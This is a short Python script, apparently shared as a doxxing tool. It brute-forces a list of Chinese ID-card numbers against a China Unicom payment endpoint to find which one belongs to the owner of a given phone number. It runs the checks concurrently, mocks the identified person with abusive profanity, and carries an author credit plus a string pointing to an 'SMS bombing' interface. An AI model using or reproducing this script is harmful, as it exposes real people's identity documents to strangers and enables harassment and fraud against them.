import requests
import concurrent.futures

# 显示作者信息
print("搬运请带上作者：@PL66600")

def verify_id(phone, id_number):
    url = "http://upay.10010.com/npfweb/NpfWeb/outerPayfee/getMustPayment"
    data = (
        f"commonBean.phoneNo={phone}&"
        f"commonBean.psptID={id_number}&"
        "commonBean.psptTypeCode=TG 短信轰炸接口&"
        "commonBean.provinceCode=074&"
        "commonBean.cityCode=741&"
        "commonBean.netCode=01"
    )
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(url, data=data, headers=headers)
    
    if response.status_code == 200:
        try:
            response_data = response.json()
            if response_data.get('out') == 'success':
                return id_number, '验证通过'
            else:
                return id_number, '验证不通过'
        except ValueError:
            return id_number, '响应数据格式错误'
    else:
        return id_number, f'请求失败，状态码：{response.status_code}'

def batch_verify_ids(phone, file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        id_numbers = [line.strip() for line in file if line.strip()]
    
    success = False

    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_id = {executor.submit(verify_id, phone, id_number): id_number for id_number in id_numbers}
        for future in concurrent.futures.as_completed(future_to_id):
            id_number = future_to_id[future]
            try:
                id_number, result = future.result()
                if result == '验证通过':
                    print(f"还核验你妈个逼呢？这不是（{id_number}）这个傻逼么？")
                    success = True
                    break
                else:
                    print(f"手机号码: {phone}, 身份证号: {id_number}, 核验结果: {result}")
            except Exception as exc:
                print(f"身份证号 {id_number} 生成异常: {exc}")
    
    if not success:
        print("没有找到验证通过的身份证号。")

if __name__ == "__main__":
    phone = input("请输入联通手机号码: ")
    file_path = input("请输入身份证号文件的完整路径: ")
    batch_verify_ids(phone, file_path)
    print("搬运请带上作者：@PL66600")